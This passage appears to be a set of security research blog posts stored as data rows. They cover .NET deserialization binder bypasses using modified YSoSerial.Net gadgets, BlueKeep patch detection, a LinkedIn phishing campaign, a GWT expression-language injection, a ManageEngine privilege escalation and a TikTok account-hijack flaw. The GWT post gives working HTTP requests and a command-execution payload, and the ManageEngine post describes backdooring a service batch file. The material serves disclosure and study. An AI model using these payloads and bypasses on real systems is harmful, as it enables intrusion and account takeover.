it is possible to craft the assembly name and type name pair that does fail loading while the fallback ObjectReader.FastBindToType(string, string) still returns the proper type. In the first attempt, we'll update the ISerializable.GetObjectData(SerializationInfo, StreamingContext) implementation of the DataSet gadget of YSoSerial.Net so that the assembly name is mscorlib and the type name the AQN of System.Data.DataSet : diff --git a/ysoserial/Generators/DataSetGenerator.cs b/ysoserial/Generators/DataSetGenerator.cs index ae4beb8..1755e62 100644 --- a/ysoserial/Generators/DataSetGenerator.cs +++ b/ysoserial/Generators/DataSetGenerator.cs @@ -62,7 +62,8 @@ namespace ysoserial.Generators public void GetObjectData(SerializationInfo info, StreamingContext context) { - info.SetType(typeof(System.Data.DataSet)); + info.AssemblyName = ""mscorlib""; + info.FullTypeName = typeof(System.Data.DataSet).AssemblyQualifiedName; info.AddValue(""DataSet.RemotingFormat"", System.Data.SerializationFormat.Binary); info.AddValue(""DataSet.DataSetName"", """"); info.AddValue(""DataSet.Namespace"", """"); With a breakpoint at DXSerializationBinder.BindToType(string, string) , we'll see that the first call to SafeSerializationBinder.Ensure(string, string) gets passed. This is because we use the AQN of System.Data.DataSet as type name while UnsafeTypes.types only contains the full name System.Data.DataSet instead. And as the pair of assembly name mscorlib and type name prefix System. is contained in KnownTypes.typeRanges , it will pass validation. But now the assembly name and type name are passed to SafeSerializationBinder.EnsureAssemblyQualifiedTypeName(string, string) : That method probably tries to extract the type name and assembly name from an AQN passed in the typeName . It does this by looking for the last position of , in typeName and whether the part behind that position starts with version= . If that's not the case, the loop looks for the second last, then the third last, and so on. If version= was found, the algorithm assumes that the next iteration would also contain the assembly name (remember, the version is the first assembly attribute in the normalized form), flag gets set to true and in the next loop the position of the preceeding , marks the delimiter between the type name and assembly name. At the end, the passed assemblyName value stored in a and the extracted assemblyName values get compared. If they differ, true gets returned an the extracted assembly name and type name are checked by another call to SafeSerializationBinder.Ensure(string, string) . With our AQN passed as type name, SafeSerializationBinder.EnsureAssemblyQualifiedTypeName(string, string) extracts the proper values so that the call to SafeSerializationBinder.Ensure(string, string) throws an exception. That didn't work. So in what cases does SafeSerializationBinder.EnsureAssemblyQualifiedTypeName(string, string) return false so that the second call to SafeSerializationBinder.Ensure(string, string) does not happen? There are five return statements: three always return false (lines 28, 36, and 42) and the other two only return false when the passed assemblyName value equals the extracted assembly name (lines 21 and 51). Let's first look at those always returning false : in two cases (line 28 and 42), the condition depends on whether the typeName contains a ] after the last , . We can achieve that by adding a custom assembly attribute to our AQN that contains a ] , which is perfectly valid: diff --git a/ysoserial/Generators/DataSetGenerator.cs b/ysoserial/Generators/DataSetGenerator.cs index ae4beb8..1755e62 100644 --- a/ysoserial/Generators/DataSetGenerator.cs +++ b/ysoserial/Generators/DataSetGenerator.cs @@ -62,7 +62,8 @@ namespace ysoserial.Generators public void GetObjectData(SerializationInfo info, StreamingContext context) { - info.SetType(typeof(System.Data.DataSet)); + info.AssemblyName = ""mscorlib""; + info.FullTypeName = typeof(System.Data.DataSet).AssemblyQualifiedName + "", x=]""; info.AddValue(""DataSet.RemotingFormat"", System.Data.SerializationFormat.Binary); info.AddValue(""DataSet.DataSetName"", """"); info.AddValue(""DataSet.Namespace"", """"); Now the SafeSerializationBinder.EnsureAssemblyQualifiedTypeName(string, string) returns false without updating the typeName or assemblyName values. Loading the mscorlib assembly will succeed but the specified DataSet type won't be found in it so that DXSerializationBinder.BindToType(string, string) also returns null and the ObjectReader.FastBindToType(string, string) attempts to load the type, which finally succeeds. Case Study № 2: ChainedSerializationBinder in Exchange Server (CVE-2022-23277) After my colleage @frycos published his story on Searching for Deserialization Protection Bypasses in Microsoft Exchange (CVE-2022–21969) , I was curious whether it was possible to still bypass the security measures implemented in the Microsoft.Exchange.Diagnostics.ChainedSerializationBinder class. The ChainedSerializationBinder is used for a BinaryFormatter instance created by Microsoft.Exchange.Diagnostics.ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation, bool, string[], string[]) to resolve the specified type and then test it against a set of allowed and disallowed types to abort deserialization in case of a violation. Within the ChainedSerializationBinder.BindToType(string, string) method, the passed assembly name and type name parameters are forwarded to InternalBindToType(string, string) (not depicted here) and then to LoadType(string, string) . Note that only if the type was loaded successfully, it gets validated using the ValidateTypeToDeserialize(Type) method. Inside LoadType(string, string) , it is attempted to load the type by combining both values in various ways, either via Type.GetType(string) or by iterating the already loaded assemblies and then using Assembly.GetType(string) on it. If loading of the type fails, LoadType(string, string) returns null and then BindToType(string, string) also returns null while the validation via ValidateTypeToDeserialize(Type) only happens if the type was successfully loaded. When the ChainedSerializationBinder.BindToType(string, string) method returns to the ObjectReader.Bind(string, string) method, the fallback method ObjectReader.FastBindToType(string, string) gets called for resolving the type. Now as ChainedSerializationBinder.BindToType(string, string) uses a different algorithm to resolve the type than ObjectReader.FastBindToType(string, string) does, it is possible to bypass the validation of ChainedSerializationBinder via the aforementioned tricks. Here either of the two ways (a custom marshal class or a custom SerializationBinder during serialization) do work. The following demonstrates this with System.Data.DataSet : Conclusion The insecure serializers BinaryFormatter , SoapFormatter , and NetDataContractSerializer should no longer be used and legacy code should be migrated to the preferred alternatives . If you happen to encounter a SerializationBinder , check how the type resolution and/or validation is implemented and whether BindToType(string, string) has a case that returns null so that the fallback ObjectReader.FastBindToType(string, string) may get a chance to resolve the type instead."
7722f434-3ef2-54c7-96f2-9df35c9f73ae,31-May-2019,Avoiding the DoS: How BlueKeep Scanners Work,Vulnerability CVE-2019-0708 is a vulnerability in the RDP protocol. The vulnerability allows an attacker to bind a channel outside of the normal one. This allows the attacker to perform a use-after-free inside the TERMDD.SYS driver. I present a proof-of-concept exploit to determine if the target is patched.,"Background RDP Channel Internals MS_T120 I/O Completion Packets MS_T120 Port Data Dispatch Patch Detection Vulnerable Host Behavior Patched Host Behavior CPU Architecture Differences Conclusion Background On May 21, @JaGoTu and I released a proof-of-concept for CVE-2019-0708 . This vulnerability has been nicknamed "" BlueKeep "". Instead of causing code execution or a blue screen, our exploit was able to determine if the patch was installed. Now that there are public denial-of-service exploits, I am willing to give a quick overview of the luck that allows the scanner to avoid a blue screen and determine if the target is patched or not. RDP Channel Internals The RDP protocol has the ability to be extended through the use of static (and dynamic) virtual channels, relating back to the Citrix ICA protocol. The basic premise of the vulnerability is that there is the ability to bind a static channel named ""MS_T120"" (which is actually a non-alpha illegal name ) outside of its normal bucket. This channel is normally only used internally by Microsoft components, and shouldn't receive arbitrary messages. There are dozens of components that make up RDP internals, including several user-mode DLLs hosted in a SVCHOST.EXE and an assortment of kernel-mode drivers. Sending messages on the MS_T120 channel enables an attacker to perform a use-after-free inside the TERMDD.SYS driver. That should be enough information to follow the rest of this post. More background information is available from ZDI . MS_T120 I/O Completion Packets After you perform the 200-step handshake required for the (non-NLA) RDP protocol, you can send messages to the individual channels you've requested to bind. The MS_T120 channel messages are managed in the user-mode component RDPWSX.DLL. This DLL spawns a thread which loops in the function rdpwsx!IoThreadFunc. The loop waits via I/O completion port for new messages from network traffic that gets funneled through the TERMDD.SYS driver. Note that most of these functions are inlined on Windows 7, but visible on Windows XP. For this reason I will use XP in screenshots for this analysis. MS_T120 Port Data Dispatch On a successful I/O completion packet, the data is sent to the rdpwsx!MCSPortData function. Here are the relevant parts: We see there are only two valid opcodes in the rdpwsx!MCSPortData dispatch: 0x0 - rdpwsx!HandleConnectProviderIndication 0x2 - rdpwsx!HandleDisconnectProviderIndication + rdpwsx!MCSChannelClose If the opcode is 0x2, the rdpwsx!HandleDisconnectProviderIndication function is called to perform some cleanup, and then the channel is closed with rdpwsx!MCSChannelClose. Since there are only two messages, there really isn't much to fuzz in order to cause the BSoD. In fact, almost any message dispatched with opcode 0x2, outside of what the RDP components are expecting, should cause this to happen. Patch Detection I said almost any message, because if you send the right sized packet, you will ensure that proper cleanup is performed: It's real simple: If you send a MS_T120 Disconnect Provider (0x2) message that is a valid size, you get proper clean up. There should not be risk of denial-of-service. The use-after-free leading to RCE and DoS only occurs if this function skips the cleanup because the message is the wrong size! Vulnerable Host Behavior On a VULNERABLE host, sending the 0x2 message of valid size causes the RDP server to cleanup and close the MS_T120 channel. The server then sends a MCS Disconnect Provider Ultimatum PDU packet, essentially telling the client to go away. And of course, with an invalid size, you RCE/BSoD. Patched Host Behavior However on a patched host, sending the MS_T120 channel message in the first place is a NOP... with the patch you can no longer bind this channel incorrectly and send messages to it. Therefore, you will not receive any disconnection notice. In our scanner PoC, we sleep for 5 seconds waiting for the MCS Disconnect Provider Ultimatum PDU, before reporting the host as patched. CPU Architecture Differences Another stroke of luck is the ability to mix and match the x86 and x64 versions of the 0x2 message. The 0x2 messages require different sizes between the two architectures, which one might think sending both at once should cause the denial-of-service. Simply, besides the sizes being different, the message opcode is in a different offset. So on the opposite architecture, with a 0'd out packet (besides the opcode), it will think you are trying to perform the Connect 0x0 message. The Connect 0x0 message requires a much larger message and other miscellaneous checks to pass before proceeding. The message for another architecture will just be ignored. This difference can possibly also be used in an RCE exploit to detect if the target is x86 or x64, if a universal payload is not used. Conclusion This is an interesting quirk that luckily allows system administrators to quickly detect which assets remain unpatched within their networks. I released a similar scanner for MS17-010 about a week after the patch, however it went largely unused until big-name worms such as WannaCry and NotPetya started to hit. Hopefully history won't repeat and people will use this tool before a crisis. Unfortunately, @ErrataRob used a fork of our original scanner to determine that almost 1 million hosts are confirmed vulnerable and exposed on the external Internet. It is my knowledge that the 360 Vulcan team released a (closed-source) scanner before @JaGoTu and I, which probably follows a similar methodology. Products such as Nessus have now incorporated plugins with this methodology. While this blog post discusses new details about RDP internals related the vulnerability, it does not contain useful information for producing an RCE exploit that is not already widely known."
f60f46cb-55f8-5886-a882-e7942cd0b2a5,19-October,Operation “Space Race”: reaching the stars through professional Social Networks,Telsy analyzed some social-engineering based attacks against individuals in aerospace and avionics sector. targeted organizations are currently operating within the Italian territory. Adversary used a real-looking LinkedIn virtual identity impersonating a HR recruiter.,"At the beginning of May 2020, Telsy analyzed some social-engineering based attacks against individuals operating in the aerospace and avionics sector performed through the popular professional social network LinkedIn . According to our visibility, the targeted organizations are currently operating within the Italian territory and the targeted individuals are subjects of high professional profile in the aerospace research sector. Adversary used a real-looking LinkedIn virtual identity impersonating an HR (Human Resource) recruiter of a satellite imagery company with which it contacted the targets via internal private messages, inviting them to download an attachment containing information about a fake job vacation. Based on code similarities of analyzed pieces of malware, Telsy asserts, with a medium degree of confidence, that the reported event is to be linked with the threat actor known by community as Muddywater (aka Static Kitten , aka Mercury ). For questions, concerns or more information regarding the reported event, it’s possibile to refer to the email address threatint@telsy.com Download the full PDF report by clicking on the icon below: In addition, it’s possible to refer to our GitHub repository for text format Indicators of Compromise Check more related articles on our blog ."
3728e018-c3d1-56a3-b708-39388659116d,22-May-2017,From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection,A semi-complex expression language injection vulnerability is triggered in a Google Web Toolkit endpoint. Matthias Kaiser helped me exploit the vulnerability. I found the vulnerability in a GWT endpoint mapping in the WEB-INF/web.xml.,"This is a follow up blog post to my previous post on auditing Google Web Toolkit (GWT). Today we are going to focus on a specific vulnerability that I found in a GWT endpoint that Matthias Kaiser helped me exploit. Please note that the code has been changed to protect the not so innocent whilst they patch. TL;DR; I explain a semi-complex expression language injection vulnerability which is triggered in a Google Web Toolkit (GWT) endpoint. The vulnerability Within the WEB-INF/web.xml file, I found the following endpoint mapping: <servlet> <servlet-name> someService </servlet-name> <servlet-class> com.aaa.bbb.ccc.ddd.server.SomeServiceImpl </servlet-class> </servlet> <servlet-mapping> <servlet-name> someService </servlet-name> <url-pattern> /someService.gwtsvc </url-pattern> </servlet-mapping> We can see that the above code references the server mapping. Since GWT works by defining client classes that denote which methods are available for the client to access, let’s start by looking at the corresponding client class com.aaa.bbb.ccc.ddd. client .SomeService: public abstract interface SomeService extends RemoteService { public abstract void sendBeanName ( String paramString ); public abstract Boolean setMibNodesInfo ( List < MIBNodeModel > paramList ); public abstract void createMibNodeGettingBean (); } There are three functions that look interesting that we can reach, lets strip them out of the server code and see what each one does. Reading the Java code in the main jar archive that contains the class SomeServiceImpl we find the following code: public void sendBeanName ( String paramString ) { if ( paramString == null ) { return ; } HttpSession localHttpSession = super . getThreadLocalRequest (). getSession (); if ( localHttpSession != null ) { localHttpSession . setAttribute ( ""MibWidgetBeanName"" , paramString ); } } Ok, so we can set a session attribute named MibWidgetBeanName with a string we can control. So far, nothing interesting. Let’s investigate the setMibNodesInfo function: public Boolean setMibNodesInfo ( List < MIBNodeModel > paramList ) { List localList = ModelUtil . mibNodeModelList2MibNodeList ( paramList ); if ( localList != null ) { MibNodesSelect localMibNodesSelect = getBeanByName (); This function accepts a List type using a complex type MIBNodeModel . The mibNodeModelList2MibNodeList function will check to see if what we supplied was a valid List and return different strings based on what values are contained within the first element of the List. If there are no values supplied in the our List, it will define a List and return it with a default instances of MIBNodeModel . Then, the getBeanByName function is callled. Let’s go ahead and investigate this function. private MibNodesSelect getBeanByName () { ... Object localObject1 = super . getThreadLocalRequest (). getSession (); if ( localObject1 != null ) { localObject2 = ( String )(( HttpSession ) localObject1 ). getAttribute ( ""MibWidgetBeanName"" ); if ( localObject2 != null ) { localObject3 = null ; try { localObject3 = ( MibNodesSelect ) FacesUtils . getValueExpressionObject ( localFacesContext , ""#{"" + ( String ) localObject2 + ""}"" ); } finally { if (( localFacesContext != null ) && ( i != 0 )) { localFacesContext . release (); } } return ( MibNodesSelect ) localObject3 ; } } return null ; } Since this is a private method, it’s not reachable via the client interface and we cannot call it directly. We can see on line 8 that we get that attribute MibWidgetBeanName again and store it into a string called localObject2 . This localObject2 variable is later used on line 14 for retrieving an expression. Classic expression injection vulnerability. Well, not so classic, but somewhat obvious after decompiling the code. Exploitation First of all, the observing reader will notice that this is not a reflective type of expression language injection. Meaning you cannot view the results of code executing to verify the vulnerability. Thus, I clasify it as a blind expression language injection vulnerability . I digress by demonstrating an example. Suppose we have a vulnerability in a Java Servlet Faces (JSF) application that looks like so: < h: outputText value = ""${beanEL.ELAsString(request.getParameter('expression'))}"" /> An attacker could simply perform the following request: http://[target]/some_endpoint/vuln.jsf?expression=9%3b1 Since a browser translates the + as a space, we encode the + so that what we are really sending is 9+1 and upon server response, if we see a value of 10 then we know that we have an expression language injection vulnerability since the math operation executed. This is the method Burp Suite uses to detect template injection vulnerabilities. However, given our vulnerable code above, we cannot easily determine an expression language injection vulnerability, or could we? After experimenting with the JSF api I found some very neat functions that allow us to fully determine the presence of a EL Injection vulnerability without making outgoing HTTP requests. The oracle documentation states that you can use the getExternalContext method on the FacesContext instance. This method returns a ExternalContext type which can allow us to set specific reponse object properties. When I was investigating this, two functions came to mind: setResponseCharacterEncoding redirect Therefore, we could set the string to the following Java code: facesContext . getExternalContext (). redirect ( ""https://srcincite.io/"" ); …and if the response was a 302 redirect to https://srcincite.io/ then we can confirm the code is vulnerable. Testing the vulnerability The first request we need to do is to set the session attribute MibWidgetBeanName POST /someService.gwtsvc HTTP/1.1 Host: [target] Accept: */* X-GWT-Module-Base: X-GWT-Permutation: Cookie: JSESSIONID=[cookie] Content-Type: text/x-gwt-rpc; charset=UTF-8 Content-Length: 195 6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|facesContext.getExternalContext().redirect(""https://srcincite.io/"")|1|2|3|4|1|5|6| With a server response of //OK[[],0,6] we know that our GWT injection was successful. Then, the second request to trigger the stored in a session string, expression language injection. However, before we send that request, since we are using complex types for the setMibNodesInfo function, we need to look up the policy file that defines the available types allowed to send. Within the [strong name].gwt.rpc file, I found the following type value for ArrayList: java.util.ArrayList/382197682 . Now we can go ahead and use that type in the request: POST /someService.gwtsvc HTTP/1.1 Host: [target] Accept: */* X-GWT-Module-Base: X-GWT-Permutation: Cookie: JSESSIONID=[cookie] Content-Type: text/x-gwt-rpc; charset=UTF-8 Content-Length: 171 6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0| The corresponding response, looks like this: HTTP/1.1 302 Found Server: Apache-Coyote/1.1 Set-Cookie: JSESSIONID=[cookie]; Path=/; Secure; HttpOnly Set-Cookie: oam.Flash.RENDERMAP.TOKEN=-g9lc30a8l; Path=/; Secure Pragma: no-cache Cache-Control: no-cache Expires: Thu, 01 Jan 1970 00:00:00 GMT Pragma: no-cache Location: https://srcincite.io/ Content-Type: text/html;charset=UTF-8 Content-Length: 45 Date: Wed, 03 May 2017 18:58:36 GMT Connection: close //OK[0,1,[""java.lang.Boolean/476441737""],0,6] Of course, redirection is great and all for vulnerability detection, but we want shells. After reading Minded Securities excellent blog post I discovered that I can use the ScriptEngineManager ’s JavaScript engine to dynamically evaluate Java code. Their one-liner was a bit long for me, so I created one that works using the same technique. """" . getClass (). forName ( ""javax.script.ScriptEngineManager"" ). newInstance (). getEngineByName ( ""JavaScript"" ). eval ( ""var proc=new java.lang.ProcessBuilder[\\"" ( java . lang . String []) \\ ""]([\\"" cmd . exe \\ "",\\"" / c \\ "",\\"" calc . exe \\ ""]).start();"" ) Updating the MibWidgetBeanName session attribute with that code and re-triggering the setMibNodesInfo function, launches commands as SYSTEM against my target: POST /someService.gwtsvc HTTP/1.1 Host: [target] Accept: */* X-GWT-Module-Base: X-GWT-Permutation: Cookie: JSESSIONID=[cookie] Content-Type: text/x-gwt-rpc; charset=UTF-8 Content-Length: 366 6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|sendBeanName|java.lang.String|"""".getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""JavaScript"").eval(""var proc=new java.lang.ProcessBuilder[\\""(java.lang.String[])\\""]([\\""cmd.exe\\"",\\""/c\\"",\\""calc.exe\\""]).start();"")|1|2|3|4|1|5|6| Onto triggering the expression language injection… POST /someService.gwtsvc HTTP/1.1 Host: [target] Accept: */* X-GWT-Module-Base: X-GWT-Permutation: Cookie: JSESSIONID=[cookie] Content-Type: text/x-gwt-rpc; charset=UTF-8 Content-Length: 171 6|0|6||45D7850B2B5DB917E4D184D52329B5D9|com.aaa.bbb.ccc.ddd.client.SomeService|setMibNodesInfo|java.util.List|java.util.ArrayList/3821976829|1|2|3|4|1|5|6|0| Conclusion There is almost no way this vulnerability would have been discovered from a black-box perspective. Common tools such as Burp Suite have no chance of currently detecting such vulnerabilities especially considering this particular case where the string is stored in a session attribute. As web technologies progress forward, our need for automation increases and a lack of tools, skills and knowledge in this area allows many applications to stay vulnerable to critical code execution vulnerabilities for years."
f9c38b8c-35a1-5cc8-b7ab-86d187e6a6d6,15-April-2019,Privilege Escalation in ManageEngine ADManager Plus 6.6,Zoho's ADManager Plus software allows authenticated users to escalate to NT AUTHORITY\SYSTEM in versions up to and including 6.6. The vulnerability is caused by misconfiguration of the directories in which the software is installed. The directories are created with full control assigned to the Authenticated Users group.,"During a recent review of the ADManager Plus software offered by Zoho, we were able to identify a privilege escalation vulnerability which would allow authenticated users to escalate to NT AUTHORITY\SYSTEM in versions up to and including 6.6 (build 6657). The Cause of the Vulnerability After completing the installation, the software can be found in C:\ManageEngine\ADManager Plus , assuming the default location is not changed. Within this directory are several directories with weak security settings. The affected directories are: bin lib tools The issue affecting these directories is that they are created with full control assigned to the Authenticated Users group: The Authenticated Users group in Windows is not a typical group in which users can be added or removed. If an account authenticates with the system, be it a local account or domain account, it will be deemed to be part of the Authenticated Users group. The built-in accounts such as LOCAL SERVICE do not get included in this group, as they are accounts without a password that do not require authentication. By assigning full control to Authenticated Users , any user that is logged in is capable of modifying the contents of the aforementioned directories. The bin directory is of significance, as the entry point of the software is found in this directory, along with several other core executables. An example of two files being accessed during startup can be seen in the screenshot of procmon below: As the nature of the software requires administrator privileges, due to it serving the purpose of managing an active directory environment, there is no reason to provide write access to all authenticated users. This misconfiguration is particularly dangerous due to the previously touched upon point - the software requires administrator level access. The ManageEngine ADManager Plus service is by default installed to launch using the local system account: Exploitation To exploit this vulnerability, one of the core files used by ADManager in the bin directory needs to be modified or replaced to execute a payload that will elevate one’s privileges. As previously mentioned, one must be in the context of an authenticated user, in this example, we will start as a low privilege user aptly named lowpriv : It was previously noted that when the service starts, the wrapper.exe and admanager.exe files are both accessed. Whilst it is possible to backdoor these files, they cannot be overwritten whilst the service is running. Instead, an alternative file must be found which either: Is not persistently running after startup Can be modified whilst being executed Running procmon again and looking at the results show several other files being accessed during startup - in particular, ChangeJRE.bat . As this is a batch script, even if this script continues to execute throughout the lifetime of the process, it can still be modified in place. The purpose of this file appears to be to upgrade several files if newer versions are present. For example, if a file is present in lib/native named ntlmauth.dll_new , the ntlmauth.dll file will be deleted and replaced with ntlmauth.dll_new . Although this mechanism can be abused, it would mean creating a DLL that is compatible with the previous one; there is much simpler way to utilise this file. By adding an extra line to the batch file, we can make it run another executable. Rather than just launching the executable directly, it should ideally be launched using start . This will make the executable launch in a non-blocking manner and allow ChangeJRE.bat to continue executing seamlessly: The highlighted change in the above screenshot will launch C:\ManageEngine\ADManager Plus\bin\privesc.exe alongside ChangeJRE.bat . In this case, we created privesc.exe using msfvenom : With a payload ready and the backdoored batch file, all that is left to do is upload them and wait: After initiating a reboot on the server, the previous session (running as lowpriv ) drops, and a new session is initiated as the server comes back up; this time running as NT AUTHORITY\SYSTEM : Looking at the task list after acquiring the SYSTEM shell also confirms that the modification made to ChangeJRE.bat is not blocking execution; meaning that ADManager Plus will continue to function as normal: Timeline 2018-11-15 : Vulnerability identified in build 6653 2019-01-31 : Vendor contacted via their bug bounty program 2019-01-31 : Acknowledgement from vendor and investigation opened 2019-04-15 : Vulnerability confirmed to be in the latest build (6657) 2019-02-28 : Update released to fix vulnerability 2019-04-15 : Public disclosure"
fbf159b2-461c-5cca-bf76-8ae12e803ff3,31-August-2022,Vulnerability in TikTok Android app could lead to one-click account hijacking,Microsoft discovered a high-severity vulnerability in the TikTok Android app for Android. The vulnerability could have allowed attackers to compromise users' accounts with a single click. Microsoft says the vulnerability has been fixed and there is no evidence of in-the-wild exploitation.,"Microsoft discovered a high-severity vulnerability in the TikTok Android application, which could have allowed attackers to compromise users’ accounts with a single click. The vulnerability, which would have required several issues to be chained together to exploit, has been fixed and we did not locate any evidence of in-the-wild exploitation. Attackers could have leveraged the vulnerability to hijack an account without users’ awareness if a targeted user simply clicked a specially crafted link. Attackers could have then accessed and modified users’ TikTok profiles and sensitive information, such as by publicizing private videos, sending messages, and uploading videos on behalf of users. The vulnerability allowed the app’s deeplink verification to be bypassed. Attackers could force the app to load an arbitrary URL to the app’s WebView, allowing the URL to then access the WebView’s attached JavaScript bridges and grant functionality to attackers. We’ve previously researched JavaScript bridges for their potential wide-reaching implications. Emphasizing the importance of exercising caution when clicking unknown links, this research also displays how collaboration within the security community is necessary to improve defenses for the overall digital ecosystem. TikTok has two flavors of its Android app: one for East and Southeast Asia under the package name com.ss.android.ugc.trill , and another for the remaining countries under the package name com.zhiliaoapp.musically . Performing a vulnerability assessment of TikTok, we determined that the issues were affecting both flavors of the app for Android, which have over 1.5 billion installations combined via the Google Play Store. After carefully reviewing the implications, a Microsoft security researcher notified TikTok of the issues in February 2022, as part of our responsible disclosure policy through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR). TikTok quickly responded by releasing a fix to address the reported vulnerability, now identified as CVE-2022-28799 , and users can refer to the CVE entry for more information. We commend the efficient and professional resolution from the TikTok security team. TikTok users are encouraged to ensure they’re using the latest version of the app. In this blog post, we share information on the issues we discovered, examine how they could have been leveraged in an attack to quickly and quietly take over targeted users’ accounts, and walk-through best practices and protections. As threats across platforms continue to grow, we also share details of our research, disclosure, and collaboration with the larger security community in the effort to continually improve security for all, regardless of the platform or device in use. JavaScript interfaces Exploitation of the vulnerability relies on the app’s implementation of JavaScript interfaces, which are provided by a component of the Android operating system called WebView. WebView allows applications to load and display web pages and, using the addJavascriptInterface API call, can also provide bridge functionality that allows JavaScript code in the web page to invoke specific Java methods of a particular class in the app. Loading untrusted web content to WebView with application-level objects accessible via JavaScript code renders the application vulnerable to JavaScript interface injection, which may lead to data leakage, data corruption, or, in some cases, arbitrary code execution. In our example, the code below demonstrates how a JavaScript interface is used, an instance of the JsObject class is injected into WebView (line 8) and it is referenced by the injectObject variable within the JavaScript code, which is loaded via the loadUrl API method (line 10): Figure 1. Adding a JavaScript interface to a WebView object Prior to Android API level 18 (released in 2013 with Android 4.3), any method of the injected class was exposed to this JavaScript code. From API level 18 onwards, only class methods with the “@JavascriptInterface” annotation can be invoked (depicted above in line 2). JavaScript bridge TikTok for Android uses JavaScript interfaces extensively, enhancing WebView capabilities that are used within the app. We identified a class of interest that makes use of such a WebView. It registers a JavaScript bridge that has access to every type of functionality implemented by the classes of the [redacted ] .bridge.* package. This bridge exposes the method depicted below: Figure 2. Rendering the method callable via the JavaScript code The arg1 corresponds to a JSON string that consists of several attributes, with the func and params attributes as the most relevant. The func attribute corresponds to the name of the Java method that is invoked from the JavaScript code, while the params attribute sets arguments that this method takes. For example, to call the Java method with signature String foo(String arg1, String arg2) from the JavaScript code, the following statement must be used: Figure 3. Example code invoking a Java method via the JavaScript interface. The result is returned as a JSON string to a callback defined in the JavaScript code, which takes a single string as an argument. Figure 4. Interaction between Java and web components using the JavaScript interface The above figure visualizes the concept and depicts the following steps: The application loads the website example.com to its WebView The JavaScript code, which is fetched from the remote server, invokes the Java method The method is executed The result is returned as a parameter to the callback function Finally, the handler method can process the result locally or send it to an external server using an XMLHttpRequest , a built-in browser object that can also be leveraged during an attack to send stolen data to an attacker’s server. Diving into deeplinks The vulnerability itself was ultimately found to reside in the app’s handling of a particular deeplink. In the context of the Android operating system, a deeplink is a special hyperlink that links to a specific component within a mobile app and consists of a scheme and (usually) a host part. When a deeplink is clicked, the Android package manager queries all the installed applications to see which one can handle the deeplink and then routes it to the component declared as its handler. A deeplink must be declared in the application’s manifest to be used by components outside of the application’s context: Figure 5. An example of adding an intent filter in the app’s manifest for deep linking. In the example above in Figure 5, The user clicks the link http://www.example[.]com/gizmos . Since more than one application can handle the scheme, the system then presents a dialog box, also known as ambiguity dialog, similar to the one depicted below in Figure 6. A deeplink in the form of example://gizmos is routed directly to the activity GizmosActivity , the component declared as the deeplink handler in this case. Figure 6. Ambiguity dialog To avoid the ambiguity dialog for http and https schemes, an application may declare an Android App Link by using the autoVerify attribute in its intent filter to signal the system to verify the association between the app and the declared URL domain. Additionally, a JSON file that contains the application’s package name and its certificate’s SHA256 fingerprint must be published under https://domain.name/.well-known/directory. TikTok for Android uses this feature for the domain m.tiktok.com , meaning all the links matching to the specific domain will be routed to the application without presenting the ambiguity dialog. Besides deeplinks that are exported in the Android manifest, an application can also exchange data between its components using internal deeplinks. Trying to open an internal deeplink from outside the application, like in a web browser, will return an “unable to resolve Intent” error message as the system can’t route it to the appropriate handler. Vulnerability findings It’s important to understand the various components at play that allow the vulnerability to be exploited, such as the app’s implementation of JavaScript interfaces, since they determine the impact of the vulnerability itself. While reviewing the app’s handling of a specific deeplink, we discovered several issues that, when chained together, could have been used to force the application to load an arbitrary URL to the application’s WebView. By crafting this URL with additional query parameters, it was possible to inject an instance of the JavaScript bridge that provides full access to the functionality implemented by the [redacted] .bridge.* package. What follows is a technical description of the vulnerability, which we analyzed using the TikTok Android application with the package name com.zhiliaoapp.musically . The same description applies for the TikTok Android application com.ss.android.ugc.trill , as the vulnerabilities were found in common SDKs. Triggering the app’s internal deeplinks TikTok for Android uses multiple deeplink schemes, some of which are exported via the manifest, while some are used only internally by the application. Among the exported ones, the https://m.tiktok[.]com/redirect link is handled by the [redacted] class and is used to redirect URIs to various components of the application via a query parameter: Figure 7. Identifying deeplinks and their targeted activities using Medusa We determined that it’s possible to trigger internal deeplinks via the query parameter and call non-exported activities, expanding the attack surface of the application. According to TikTok, this redirection to internal deeplinks doesn’t raise any additional concerns. As a proof of concept, we crafted a URL that uses a particular non-exported scheme to load https://www.tiktok[.]com to the application’s WebView, as displayed below in Figure 8: Figure 8. Using a link to trigger an internally used scheme and load Tiktok.com. Although the [redacted-internal-scheme] ://webview?url=<website> deeplink can be used to load URLs to the CrossPlatformActivity’s WebView via a query parameter, the application imposes filters to reject untrusted hosts. In contrast to the Tiktok.com domain successfully loading, as shown in Figure 8 above, Figure 9 below displays the domain Example.com being rejected by the application filters: Figure 9. The application’s filters rejecting the [redacted-internal-scheme] ://webview?url=https://www.example[.]com deeplink The filtering takes place on the server-side and the decision to load or reject a URL is based on the reply received from a particular HTTP GET request. Our static analysis indicated that it is possible to bypass the server-side check by adding two additional parameters to the deeplink. The WebView attached to the activity creates instances of the JavaScript bridge, which we verified dynamically using Medusa’s WebView module. From this point on, the website assigned to the query parameter of the [redacted-scheme] ://webview scheme has full access to the JavaScript bridge, meaning the website’s JavaScript code can now access and invoke any exposed functionality found under the [redacted] .bridge.* package. Exposed functionality Reviewing the functionality accessible to the JavaScript code in web pages loaded to WebView, we identified more than 70 exposed methods. When paired with an exploit to hijack WebView, such as the vulnerability we discovered, these methods can be invoked to grant functionality to attackers. Some of the exposed methods can access or modify users’ private information, while others can perform authenticated HTTP requests to any URL given as a parameter. Moreover, the method accepts a set of parameters in the form of a JSON string that can be used to form the body of a POST request and returns the server’s reply, including the headers. By invoking such methods, an attacker can: Retrieve the user’s authentication tokens by triggering a request to a controlled server and logging the cookie and the request headers. Retrieve or modify the user’s TikTok account data, such as private videos and profile settings, by triggering a request to a TikTok endpoint and retrieving the reply via the JavaScript callback. In short, by controlling any of the methods able to perform authenticated HTTP requests, a malicious actor could have compromised a TikTok user account. Proof of concept In the following proof of concept, the attacker sends a crafted link to a targeted TikTok user. Once the user clicks the link, the video uploading authentication tokens are 